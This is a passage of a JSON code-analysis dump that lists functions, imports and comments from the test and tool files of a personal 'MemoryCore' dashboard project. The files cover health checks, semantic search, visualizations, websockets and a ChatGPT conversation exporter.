          "def test_health_check_recovery(mock_health_check):\n\"\"\"Test health check recovery handling.\"\"\"\ncomponent_name = 'recovery_test'\n\n# Simulate component failure\ndef failing_check():\nraise Exception(\"Component failure\")\n\nresult1 = mock_health_check.check_component_health(component_name, failing_check)\nassert result1['healthy'] is False",
          "def failing_check():",
          "def recovered_check():",
          "def test_concurrent_health_checks(mock_health_check):\n\"\"\"Test concurrent health check handling.\"\"\"\nimport concurrent.futures\nimport time\n\ndef slow_check():\ntime.sleep(0.1)\nreturn {'status': 'healthy'}\n\n# Run multiple health checks concurrently",
          "def slow_check():",
          "def test_metrics_cache_invalidation(mock_health_check):\n\"\"\"Test metrics cache invalidation.\"\"\"\n# Get metrics twice in quick succession\nmetrics1 = mock_health_check.check_system_resources()\nmetrics2 = mock_health_check.check_system_resources()\n\n# Should use cached values\nassert mock_health_check._get_system_metrics.call_count == 1\n\n# Wait for cache invalidation"
        ],
        "class_defs": [],
        "imports": [
          "import pytest",
          "from pathlib import Path",
          "from unittest.mock import MagicMock, patch",
          "import json",
          "from ..src.utils.health_check import HealthCheck",
          "import concurrent.futures",
          "import time"
        ],
        "comments": [
          "# Simulate high CPU usage",
          "# Generate some test history",
          "# Test with high memory usage but below custom threshold",
          "# Simulate component failure",
          "# Simulate recovery",
          "# Verify recovery was logged",
          "# Run multiple health checks concurrently",
          "# Get metrics twice in quick succession",
          "# Should use cached values",
          "# Wait for cache invalidation",
          "# Should fetch fresh metrics"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/tests/test_memory_integration.py",
        "docstrings": [],
        "function_defs": [
          "def setUp(self):",
          "def tearDown(self):",
          "def test_chatgpt_export_empty(self):\n\"\"\"Test that ChatGPT export handles empty state properly\"\"\"\nexporter = ChatGPTExporter(self.base_path)\nresult = exporter.export_conversations()\nself.assertEqual(result, [])\n\ndef test_save_and_export_conversation(self):\n\"\"\"Test saving and then exporting a conversation\"\"\"",
          "def test_save_and_export_conversation(self):\n\"\"\"Test saving and then exporting a conversation\"\"\"\nexporter = ChatGPTExporter(self.base_path)\n\n# Create test conversation\ntest_conversation = {\n\"id\": \"test_chat_01\",\n\"create_time\": \"2025-09-05T10:00:00Z\",\n\"update_time\": \"2025-09-05T10:30:00Z\",\n\"title\": \"Test Conversation\","
        ],
        "class_defs": [
          "class TestMemoryIntegration(unittest.TestCase):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import unittest",
          "from pathlib import Path",
          "import shutil",
          "from src.memory.chatgpt_extractor import ChatGPTExporter"
        ],
        "comments": [
          "# Add src to Python path",
          "# Now we can import our modules",
          "# Clean up any test files",
          "# Create test conversation",
          "# Save conversation",
          "# Export and verify"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/tests/test_semantic_search.py",
        "docstrings": [],
        "function_defs": [
          "def setUp(self):",
          "def tearDown(self):",
          "def test_search_exact_match(self):\n\"\"\"Test search with exact term matches.\"\"\"\nresults = self.search.search(\"semantic search\")\nself.assertGreater(len(results), 0)\nself.assertEqual(results[0].source_id, 'test1')\nself.assertGreater(results[0].score, 0.7)  # High confidence for exact match\n\ndef test_search_semantic_similarity(self):\n\"\"\"Test search with semantically similar terms.\"\"\"",
          "def test_search_semantic_similarity(self):\n\"\"\"Test search with semantically similar terms.\"\"\"\nresults = self.search.search(\"speed issues\")  # Should match performance-related memories\nself.assertGreater(len(results), 0)\n# Should find memory about latency\nperformance_related = [r.source_id for r in results if r.source_id in ['test1', 'test3']]\nself.assertGreater(len(performance_related), 0)\n\ndef test_context_extraction(self):\n\"\"\"Test context extraction from search results.\"\"\"",
          "def test_context_extraction(self):\n\"\"\"Test context extraction from search results.\"\"\"\n# Test with related performance terms\nperformance_terms = [\"performance\", \"speed\", \"latency\"]\nresults = self.search.search(\"system performance\")\nself.assertGreater(len(results), 0)\n\nfor result in results:\nself.assertIsNotNone(result.context)\nself.assertGreater(len(result.context), 0)",
          "def test_threshold_filtering(self):\n\"\"\"Test that results below threshold are filtered out.\"\"\"\n# Set a very high threshold\nself.search.config.score_threshold = 0.95\nresults = self.search.search(\"completely unrelated query\")\nself.assertEqual(len(results), 0)\n\ndef test_memory_stats(self):\n\"\"\"Test statistics generation.\"\"\"",
          "def test_memory_stats(self):\n\"\"\"Test statistics generation.\"\"\"\nstats = self.search.get_stats()\nself.assertEqual(stats['total_memories'], 3)\nself.assertGreater(stats['index_size_mb'], 0)\nself.assertEqual(stats['unique_sources'], 3)\n\nif __name__ == '__main__':\nunittest.main()\n"
        ],
        "class_defs": [
          "class TestSemanticSearch(unittest.TestCase):"
        ],
        "imports": [
          "import unittest",
          "from pathlib import Path",
          "import shutil",
          "import tempfile",
          "from src.memory.semantic_search import SemanticSearchEngine, SearchConfig"
        ],
        "comments": [
          "# Create temporary directory for test data",
          "# Add test memories",
          "# Clean up test directory",
          "# Should find memory about latency",
          "# Test with related performance terms",
          "# Check if any performance-related term is in the context",
          "# Set a very high threshold"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/tests/test_services.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, name: str, test_mode: bool = False):",
          "def _run(self):\n\"\"\"Test run implementation.\"\"\"\nself.run_count += 1\nif self.should_fail:\nraise Exception(\"Test failure\")\nwhile self.running and not self.test_mode:\ntime.sleep(0.1)\n\nclass TestBaseService(unittest.TestCase):\n\"\"\"Test cases for BaseService.\"\"\"",
          "def setUp(self):\n\"\"\"Set up test environment.\"\"\"\n# Create temp directory for test files\nself.test_dir = tempfile.mkdtemp()\nself.addCleanup(shutil.rmtree, self.test_dir)\n\n# Configure service paths\nservice_config.base_path = Path(self.test_dir)\nservice_config.create_dirs()\n",
          "def test_initialization(self):\n\"\"\"Test service initialization.\"\"\"\nself.assertEqual(self.service.name, 'test_service')\nself.assertFalse(self.service.running)\nself.assertEqual(self.service.error_count, 0)\nself.assertIsNone(self.service.last_error)\n\ndef test_start_stop(self):\n\"\"\"Test service start/stop.\"\"\"",
          "def test_start_stop(self):\n\"\"\"Test service start/stop.\"\"\"\n# Start service\nself.assertTrue(self.service.start())\nself.assertTrue(self.service.running)\nself.assertEqual(self.service.state['status'], 'running')\n\n# Stop service\nself.service.stop()\nself.assertFalse(self.service.running)",
          "def test_error_handling(self):\n\"\"\"Test error handling and recovery.\"\"\"\nself.service.should_fail = True\nself.assertFalse(self.service.start())\nself.assertEqual(self.service.error_count, 3)  # Max retries\nself.assertFalse(self.service.running)\nself.assertEqual(self.service.state['status'], 'failed')\n\ndef test_state_persistence(self):\n\"\"\"Test state saving and loading.\"\"\"",
          "def test_state_persistence(self):\n\"\"\"Test state saving and loading.\"\"\"\nself.service.start()\ntime.sleep(0.1)  # Allow time for state update\nself.service.stop()\n\n# Verify state file exists and contains expected data\nstate_file = service_config.get_state_file('test_service')\nself.assertTrue(state_file.exists())\n",
          "def test_logging(self):\n\"\"\"Test service logging.\"\"\"\nlog_file = service_config.get_log_file('test_service')\n\n# Generate some log entries\nself.service.logger.info(\"Test info message\")\nself.service.logger.error(\"Test error message\")\n\n# Verify log file\nself.assertTrue(log_file.exists())"
        ],
        "class_defs": [
          "class TestService(BaseService):",
          "class TestBaseService(unittest.TestCase):"
        ],
        "imports": [
          "import unittest",
          "import tempfile",
          "import shutil",
          "from pathlib import Path",
          "import time",
          "import logging",
          "import json",
          "from src.services.base_service import BaseService",
          "from src.config.service_config import service_config"
        ],
        "comments": [
          "# Create temp directory for test files",
          "# Configure service paths",
          "# Create test service",
          "# Start service",
          "# Stop service",
          "# Verify state file exists and contains expected data",
          "# Generate some log entries",
          "# Verify log file"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/tests/test_visualization.py",
        "docstrings": [],
        "function_defs": [
          "def test_visualization_initialization(self, test_dir):\n\"\"\"Test visualization system initialization.\"\"\"\nviz = MemoryVisualizationDashboard(test_dir)\nassert viz.base_path == test_dir\nassert (test_dir / 'visualizations').exists()\n\ndef test_memory_cluster_visualization(self, test_dir):\n\"\"\"Test memory cluster visualization generation.\"\"\"",
          "def test_memory_cluster_visualization(self, test_dir):\n\"\"\"Test memory cluster visualization generation.\"\"\"\nviz = MemoryVisualizationDashboard(test_dir)\n\n# Sample cluster data\nclusters = {\n'cluster1': {\n'topic': 'Performance',\n'size': 5,\n'coherence': 0.8,",
          "def test_relationship_visualization(self, test_dir):\n\"\"\"Test memory relationship visualization.\"\"\"\nviz = MemoryVisualizationDashboard(test_dir)\n\n# Sample relationship data\nrelationships = [\n{'source': 'mem1', 'target': 'mem2', 'strength': 0.8},\n{'source': 'mem2', 'target': 'mem3', 'strength': 0.6}\n]\n",
          "def test_temporal_visualization(self, test_dir):\n\"\"\"Test temporal visualization of memory evolution.\"\"\"\nviz = MemoryVisualizationDashboard(test_dir)\n\n# Generate temporal data\nnow = datetime.now()\ntemporal_data = []\nfor i in range(5):\ntemporal_data.append({\n'timestamp': (now - timedelta(days=i)).isoformat(),",
          "def test_metrics_chart_generation(self, test_dir, mock_metrics):\n\"\"\"Test metrics chart generation.\"\"\"\nviz = MetricsVisualization(test_dir)\n\n# Generate charts for each metric type\ncharts = viz.generate_metric_charts(mock_metrics)\n\nassert 'cpu_chart' in charts\nassert 'memory_chart' in charts\nassert 'disk_chart' in charts",
          "def test_realtime_update(self, test_dir):\n\"\"\"Test real-time chart updates.\"\"\"\nviz = MetricsVisualization(test_dir)\n\n# Mock WebSocket connection\nmock_ws = MagicMock()\nviz.register_websocket(mock_ws)\n\n# Send test update\ntest_data = {'cpu_percent': 75.0}",
          "def test_threshold_visualization(self, test_dir, mock_metrics):\n\"\"\"Test threshold visualization in charts.\"\"\"\nviz = MetricsVisualization(test_dir)\n\n# Set custom thresholds\nthresholds = {\n'cpu_percent': 80.0,\n'memory_percent': 90.0,\n'disk_percent': 85.0\n}",
          "def test_timeline_generation(self, test_dir, sample_timeline_data):\n\"\"\"Test timeline visualization generation.\"\"\"\nviz = TimelineVisualization(test_dir)\n\nhtml = viz.generate_timeline(sample_timeline_data)\nsoup = BeautifulSoup(html, 'html.parser')\n\n# Check timeline elements\ntimeline = soup.find(class_='timeline')\nassert timeline is not None",
          "def test_timeline_filtering(self, test_dir, sample_timeline_data):\n\"\"\"Test timeline filtering functionality.\"\"\"\nviz = TimelineVisualization(test_dir)\n\n# Filter for error events\nfiltered_html = viz.generate_timeline(\nsample_timeline_data,\nfilters=['error']\n)\nsoup = BeautifulSoup(filtered_html, 'html.parser')",
          "def test_timeline_aggregation(self, test_dir):\n\"\"\"Test timeline data aggregation.\"\"\"\nviz = TimelineVisualization(test_dir)\n\n# Generate test events across multiple days\nevents = []\nnow = datetime.now()\nfor i in range(10):\nevents.append({\n'date': (now - timedelta(days=i)).isoformat(),"
        ],
        "class_defs": [
          "class TestMemoryVisualization:",
          "class TestMetricsVisualization:",
          "class TestTimelineVisualization:"
        ],
        "imports": [
          "import pytest",
          "from pathlib import Path",
          "from bs4 import BeautifulSoup",
          "import json",
          "from datetime import datetime, timedelta",
          "from unittest.mock import MagicMock, patch",
          "from ..src.visualizations.memory_viz import MemoryVisualizationDashboard",
          "from ..src.visualizations.metrics_viz import MetricsVisualization",
          "from ..src.visualizations.timeline_viz import TimelineVisualization"
        ],
        "comments": [
          "# Sample cluster data",
          "# Check visualization elements",
          "# Sample relationship data",
          "# Check graph elements",
          "# Generate temporal data",
          "# Check timeline elements",
          "# Generate charts for each metric type",
          "# Verify chart data",
          "# Mock WebSocket connection",
          "# Send test update",
          "# Verify WebSocket message",
          "# Set custom thresholds",
          "# Verify threshold lines in chart",
          "# Check timeline elements",
          "# Verify event types",
          "# Filter for error events",
          "# Should only show error events",
          "# Generate test events across multiple days",
          "# Aggregate by day",
          "# Verify aggregation structure",
          "# Mock WebSocket connection",
          "# Add test event",
          "# Verify WebSocket message"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@pytest.mark.asyncio"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/tests/test_websocket_server.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class TestWebSocketServer:"
        ],
        "imports": [
          "import pytest",
          "import asyncio",
          "import websockets",
          "import json",
          "from pathlib import Path",
          "from datetime import datetime",
          "from unittest.mock import MagicMock, patch",
          "from ..src.core.websocket_server import DashboardWebSocketServer"
        ],
        "comments": [
          "# Reduce intervals for testing",
          "# Start server",
          "# Connect client",
          "# Client should be removed after disconnection",
          "# Clean up",
          "# Subscribe to metrics",
          "# Unsubscribe from metrics",
          "# Subscribe to metrics",
          "# Wait for metrics broadcast",
          "# Subscribe to health updates",
          "# Wait for health broadcast",
          "# Send invalid JSON",
          "# Send metrics history query",
          "# Start server",
          "# Connect multiple clients",
          "# Subscribe all clients to metrics",
          "# Clean up",
          "# Start server",
          "# Connect and subscribe client",
          "# Abruptly close connection",
          "# Client should be removed from subscriptions",
          "# Clean up",
          "# Subscribe client",
          "# Mock failure in metrics collection",
          "# Wait for broadcast attempt",
          "# Server should still be running"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 6,
        "decorators": [
          "@pytest.fixture",
          "@pytest.fixture",
          "@pytest.mark.asyncio",
          "@pytest.mark.asyncio",
          "@pytest.mark.asyncio",
          "@pytest.mark.asyncio",
          "@pytest.mark.asyncio",
          "@pytest.mark.asyncio",
          "@pytest.mark.asyncio",
          "@pytest.mark.asyncio",
          "@pytest.mark.asyncio"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/tools/code_analyzer.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def _setup_logging(self):\n\"\"\"Set up logging configuration.\"\"\"\nhandler = logging.StreamHandler()\nformatter = logging.Formatter(\n'%(asctime)s - %(name)s - %(levelname)s - %(message)s'\n)\nhandler.setFormatter(formatter)\nself.logger.addHandler(handler)\nself.logger.setLevel(logging.INFO)\n",
          "def analyze_file(self, file_path: str) -> List[Dict[str, Any]]:\n\"\"\"Analyze a Python file for potential issues.\"\"\"\nself.issues = []\nself.current_file = file_path\n\ntry:\nwith open(file_path, 'r') as f:\ncontent = f.read()\n\n# Parse the content into an AST",
          "def _check_try_except_structure(self, tree: ast.AST):\n\"\"\"Check for issues with try/except block structure.\"\"\"\nclass TryExceptVisitor(ast.NodeVisitor):\ndef __init__(self):\nself.issues = []\nself.try_stack = []\n\ndef visit_Try(self, node):\n# Check if finally block exists without except\nif node.finalbody and not node.handlers:",
          "def __init__(self):",
          "def visit_Try(self, node):",
          "def _check_html_tag_balance(self, content: str):\n\"\"\"Check for unbalanced HTML tags in string literals.\"\"\"\n# Simple HTML tag stack checker\nlines = content.split('\\n')\nstack = []\nin_string = False\nstring_start = None\n\nfor i, line in enumerate(lines, 1):\n# Skip lines that are clearly not HTML (quick heuristic)",
          "def _check_indentation_consistency(self, content: str):\n\"\"\"Check for inconsistent indentation.\"\"\"\nlines = content.split('\\n')\nindent_sizes = set()\n\nfor i, line in enumerate(lines, 1):\nif line.strip():  # Skip empty lines\n# Calculate leading spaces\nindent = len(line) - len(line.lstrip())\nif indent > 0:",
          "def _check_string_formatting(self, tree: ast.AST):\n\"\"\"Check for potential string formatting issues.\"\"\"\nclass StringFormattingVisitor(ast.NodeVisitor):\ndef __init__(self):\nself.issues = []\n\ndef visit_JoinedStr(self, node):\n# Check f-string complexity\nif len(node.values) > 5:  # Arbitrary threshold\nself.issues.append({",
          "def __init__(self):",
          "def visit_JoinedStr(self, node):",
          "def visit_Call(self, node):",
          "def main():\n\"\"\"Main entry point for the code analyzer.\"\"\"\nif len(sys.argv) < 2:\nprint(\"Usage: python code_analyzer.py <path_to_python_file>\")\nsys.exit(1)\n\nfile_path = sys.argv[1]\nif not Path(file_path).exists():\nprint(f\"File not found: {file_path}\")\nsys.exit(1)"
        ],
        "class_defs": [
          "class CodeAnalyzer:",
          "class TryExceptVisitor(ast.NodeVisitor):",
          "class StringFormattingVisitor(ast.NodeVisitor):"
        ],
        "imports": [
          "import ast",
          "import sys",
          "from pathlib import Path",
          "import logging",
          "from typing import List, Dict, Any, Optional, Tuple"
        ],
        "comments": [
          "# Parse the content into an AST",
          "# Run all analysis methods",
          "# Check if finally block exists without except",
          "# Check for nested try blocks",
          "# Simple HTML tag stack checker",
          "# Skip lines that are clearly not HTML (quick heuristic)",
          "# Handle multi-line strings",
          "# Very basic HTML tag parsing",
          "# Closing tag",
          "# Opening tag",
          "# Calculate leading spaces",
          "# Check if we have multiple indentation sizes",
          "# Check f-string complexity",
          "# Check for format() calls",
          "# Print issues in a readable format"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/tools/error_diagnostics.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, base_path: str):",
          "def check_indentation(self, file_path: Path) -> List[Dict]:\n\"\"\"Check for indentation issues.\"\"\"\nissues = []\nwith open(file_path) as f:\nlines = f.readlines()\ncurrent_indent = 0\nfor i, line in enumerate(lines, 1):\nif line.strip() and (not line.strip().startswith('#')):\nleading_spaces = len(line) - len(line.lstrip())\nif leading_spaces % 4 != 0:",
          "def check_try_except(self, file_path: Path) -> List[Dict]:\n\"\"\"Check for incomplete try/except blocks.\"\"\"\nissues = []\nwith open(file_path) as f:\ncontent = f.read()\ntry:\ntree = ast.parse(content)\nfor node in ast.walk(tree):\nif isinstance(node, ast.Try):\nif not node.handlers:",
          "def check_network_metrics(self, file_path: Path) -> List[Dict]:\n\"\"\"Check network metrics collection code.\"\"\"\nissues = []\nwith open(file_path) as f:\ncontent = f.read()\ntry:\nconnections = psutil.net_connections()\nexcept Exception as e:\nlogger.error(f'Error getting network connections: {e}')\nconnections = []",
          "def fix_indentation(self, file_path: Path) -> bool:\n\"\"\"Fix indentation issues.\"\"\"\ntry:\nwith open(file_path) as f:\ncontent = f.read()\ntree = ast.parse(content)\nfixed = ast.unparse(tree)\nwith open(file_path, 'w') as f:\nf.write(fixed)\nreturn True",
          "def fix_try_except(self, file_path: Path) -> bool:\n\"\"\"Fix incomplete try/except blocks.\"\"\"\ntry:\nwith open(file_path) as f:\nlines = f.readlines()\nfixed_lines = []\nin_try = False\ntry_indent = 0\nfor line in lines:\nif 'try:' in line and (not in_try):",
          "def fix_network_metrics(self, file_path: Path) -> bool:\n\"\"\"Fix network metrics collection.\"\"\"\ntry:\nwith open(file_path) as f:\nlines = f.readlines()\nfixed_lines = []\nnetwork_ops = {'psutil.net_connections()': \"try:\\n    connections = psutil.net_connections()\\nexcept Exception as e:\\n    logger.error(f'Error getting network connections: {e}')\\n    connections = []\", 'requests.get(': \"try:\\n    response = requests.get(url, timeout=5)\\nexcept Exception as e:\\n    logger.error(f'Request failed: {e}')\\n    response = None\", 'socket.socket(': \"try:\\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\\n        s.settimeout(5)\\nexcept Exception as e:\\n    logger.error(f'Socket error: {e}')\"}\ni = 0\nwhile i < len(lines):\nline = lines[i]",
          "def run_diagnostics(self):\n\"\"\"Run all diagnostics and fixes.\"\"\"\ndashboard_files = list(self.dashboard_path.rglob('*.py'))\nfor file_path in dashboard_files:\nself.logger.info(f'Checking {file_path}')\nindent_issues = self.check_indentation(file_path)\ntry_except_issues = self.check_try_except(file_path)\nnetwork_issues = self.check_network_metrics(file_path)\nif indent_issues:\nself.logger.info(f'Fixing indentation issues in {file_path}')",
          "def main():"
        ],
        "class_defs": [
          "class DashboardDiagnostics:"
        ],
        "imports": [
          "import ast",
          "import logging",
          "from pathlib import Path",
          "from typing import Dict, List, Tuple",
          "import tokenize",
          "import io"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 10,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/tools/export_chatgpt.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def _count_tokens(self, text: str) -> int:\n\"\"\"Count tokens in text.\"\"\"\nreturn len(self.encoding.encode(text))\n\ndef _format_conversation(self, raw_conversation: Dict) -> Dict:\n\"\"\"Format a raw conversation into our memory format.\"\"\"",
          "def _format_conversation(self, raw_conversation: Dict) -> Dict:\n\"\"\"Format a raw conversation into our memory format.\"\"\"\ntry:\nmessages = []\nfor msg in raw_conversation.get('messages', []):\nmessages.append({\n'role': msg.get('role', 'unknown'),\n'content': msg.get('content', ''),\n'tokens': self._count_tokens(msg.get('content', '')),\n'metadata': {",
          "def export_conversations(self, conversations_dir: str):\n\"\"\"Export conversations from the given directory.\"\"\"\ntry:\nsource_dir = Path(conversations_dir)\nif not source_dir.exists():\nlogger.error(f\"Source directory not found: {source_dir}\")\nreturn\n\n# Process each conversation file\nexported = []",
          "def main():\n\"\"\"Export ChatGPT conversations.\"\"\"\n# Configure logging\nlogging.basicConfig(\nlevel=logging.INFO,\nformat='%(asctime)s - %(name)s - %(levelname)s - %(message)s'\n)\n\n# Default ChatGPT conversation directory\ndefault_dir = os.path.expanduser('~/Library/Application Support/OpenAI/conversations')"
        ],
        "class_defs": [
          "class ChatGPTExporter:"
        ],
        "imports": [
          "import os",
          "import json",
          "import logging",
          "from pathlib import Path",
          "from datetime import datetime",
          "import tiktoken",
          "from typing import Dict, List, Optional"
        ],
        "comments": [
          "# Process each conversation file",
          "# Save all conversations",
          "# Configure logging",
          "# Default ChatGPT conversation directory",
          "# Create exporter and run export"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 6,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/tests/integration/test_system.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import pytest",
          "from datetime import datetime, timedelta",
          "import asyncio",
          "import aiohttp",
          "import json",
          "from src.metrics import MetricsCollector",
          "from src.database import Database",
          "from src.api import APIServer",
          "from src.alerting import AlertManager",
          "from src.visualization import DashboardView"
        ],
        "comments": [
          "# Collect and store metrics",
          "# Verify metrics were stored",
          "# Verify metric format",
          "# Configure test alert",
          "# Trigger alert and verify notification",
          "# Verify notification was sent",
          "# Start collection",
          "# Wait for some metrics to be collected",
          "# Stop collection",
          "# Verify metrics in database",
          "# Verify specific metrics were collected",
          "# Request dashboard data",
          "# Verify metric data structure",
          "# Connect to WebSocket",
          "# Wait for initial data",
          "# Send test message",
          "# Verify subscription response",
          "# Wait for updates",
          "# Store test metrics",
          "# Test aggregation",
          "# Insert old metrics",
          "# Insert recent metrics",
          "# Run retention cleanup",
          "# Verify old metrics were removed"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": [
          "@pytest.mark.integration",
          "@pytest.mark.asyncio",
          "@pytest.mark.integration",
          "@pytest.mark.asyncio",
          "@pytest.mark.integration",
          "@pytest.mark.asyncio",
          "@pytest.mark.integration",
          "@pytest.mark.asyncio",
          "@pytest.mark.integration",
          "@pytest.mark.asyncio",
          "@pytest.mark.integration",
          "@pytest.mark.asyncio",
          "@pytest.mark.integration"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/tests/performance/test_load.py",
        "docstrings": [],
        "function_defs": [
          "def test_memory_usage(mock_metrics_collector):\n\"\"\"Test memory usage during operation.\"\"\"\ninitial_memory = psutil.Process().memory_info().rss\n\n# Perform memory-intensive operations\ndata = []\nfor i in range(10000):\ndata.append({\n\"name\": \"test_metric\",\n\"value\": i,"
        ],
        "class_defs": [],
        "imports": [
          "import pytest",
          "import asyncio",
          "import time",
          "from datetime import datetime, timedelta",
          "import aiohttp",
          "import statistics",
          "from typing import List, Dict, Any",
          "import psutil",
          "import json"
        ],
        "comments": [
          "# Make requests in batches",
          "# Wait for batch to complete",
          "# Calculate statistics",
          "# Assert performance meets requirements",
          "# Assert collection performance",
          "# Start receiving messages",
          "# Wait for messages",
          "# Cleanup",
          "# Start clients",
          "# Wait for all clients",
          "# Analyze results",
          "# Assert performance",
          "# Insert test data",
          "# Test different query patterns",
          "# Simple selection",
          "# Time range query",
          "# Aggregation query",
          "# Run queries multiple times",
          "# Assert performance",
          "# Perform memory-intensive operations",
          "# Convert to JSON to simulate real usage",
          "# Check memory after operations",
          "# Assert reasonable memory usage",
          "# Run all operations concurrently",
          "# Assert performance under concurrent load"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 3,
        "error_handling": 5,
        "decorators": [
          "@pytest.mark.performance",
          "@pytest.mark.asyncio",
          "@pytest.mark.performance",
          "@pytest.mark.asyncio",
          "@pytest.mark.performance",
          "@pytest.mark.asyncio",
          "@pytest.mark.performance",
          "@pytest.mark.asyncio",
          "@pytest.mark.performance",
          "@pytest.mark.performance",
          "@pytest.mark.asyncio"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/tests/unit/test_core.py",
        "docstrings": [],
        "function_defs": [
          "def test_metrics_collector_initialization(mock_metrics_collector):\n\"\"\"Test metrics collector initialization.\"\"\"\nassert mock_metrics_collector is not None\nassert hasattr(mock_metrics_collector, 'collect_metric')\nassert hasattr(mock_metrics_collector, 'get_metric')\n\ndef test_metric_collection(mock_metrics_collector):\n\"\"\"Test basic metric collection.\"\"\"",
          "def test_metric_collection(mock_metrics_collector):\n\"\"\"Test basic metric collection.\"\"\"\n# Collect test metrics\nmock_metrics_collector.collect_metric(\"cpu_usage\", 45.2)\nmock_metrics_collector.collect_metric(\"memory_usage\", 75.5)\n\n# Verify metrics were collected\ncpu_metrics = mock_metrics_collector.get_metric(\"cpu_usage\")\nmemory_metrics = mock_metrics_collector.get_metric(\"memory_usage\")\n",
          "def test_metric_time_range(mock_metrics_collector):\n\"\"\"Test metric collection with time ranges.\"\"\"\nstart_time = datetime.now()\n\n# Collect metrics at different times\nmock_metrics_collector.collect_metric(\"cpu_usage\", 45.2, start_time.timestamp())\nmock_metrics_collector.collect_metric(\"cpu_usage\", 48.5, (start_time + timedelta(minutes=1)).timestamp())\nmock_metrics_collector.collect_metric(\"cpu_usage\", 42.1, (start_time + timedelta(minutes=2)).timestamp())\n\n# Query with time range",
          "def test_alert_manager():\n\"\"\"Test alert manager functionality.\"\"\"\nalert_manager = AlertManager()\n\n# Configure test alert\nalert_config = {\n\"name\": \"high_cpu_usage\",\n\"metric\": \"cpu_usage\",\n\"threshold\": 90.0,\n\"duration\": 300,  # 5 minutes",
          "def test_metric_query():\n\"\"\"Test metric query building and execution.\"\"\"\nquery = MetricQuery(\"cpu_usage\")\nquery.add_filter(\"instance\", \"server-01\")\nquery.add_timerange(\ndatetime.now() - timedelta(hours=1),\ndatetime.now()\n)\nquery.add_aggregation(\"avg\", \"5m\")\n",
          "def test_timerange():\n\"\"\"Test time range calculations.\"\"\"\nnow = datetime.now()\ntimerange = TimeRange(\nnow - timedelta(hours=1),\nnow\n)\n\nassert timerange.duration == timedelta(hours=1)\nassert timerange.contains(now - timedelta(minutes=30))",
          "def test_json_serialization():\n\"\"\"Test JSON serialization of dashboard data structures.\"\"\"\ndata = {\n\"metrics\": [\n{\n\"name\": \"cpu_usage\",\n\"value\": 45.2,\n\"timestamp\": datetime.now().timestamp()\n}\n],"
        ],
        "class_defs": [],
        "imports": [
          "import pytest",
          "from datetime import datetime, timedelta",
          "import json",
          "from src.metrics import MetricsCollector",
          "from src.visualization import DashboardView",
          "from src.alerting import AlertManager",
          "from src.utils import TimeRange, MetricQuery"
        ],
        "comments": [
          "# Collect test metrics",
          "# Verify metrics were collected",
          "# Collect metrics at different times",
          "# Query with time range",
          "# Add some test metrics",
          "# Generate dashboard view",
          "# Configure test alert",
          "# Test alert triggering",
          "# Test alert resolution",
          "# Verify query structure",
          "# Test serialization"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 3,
        "error_handling": 0,
        "decorators": [
          "@pytest.mark.asyncio"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/browser_checker/.memorycore/services/docker/docker_manager.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def setup(self):\n\"\"\"Initialize the Docker management system\"\"\"\ntry:\n# Create necessary directories\nfor path in [self.config_path, self.data_path, self.log_path, self.state_path]:\npath.mkdir(parents=True, exist_ok=True)\n\n# Setup logging\nlog_file = self.log_path / \"docker_manager.log\"\nlogging.basicConfig(",
          "def load_config(self) -> Dict:\n\"\"\"Load or create configuration\"\"\"\ntry:\nconfig_file = self.config_path / \"docker_config.yaml\"\nif not config_file.exists():\n# Create default configuration\nconfig = {\n\"registries\": {\n\"docker.io\": {\n\"username\": \"memorycore\",",
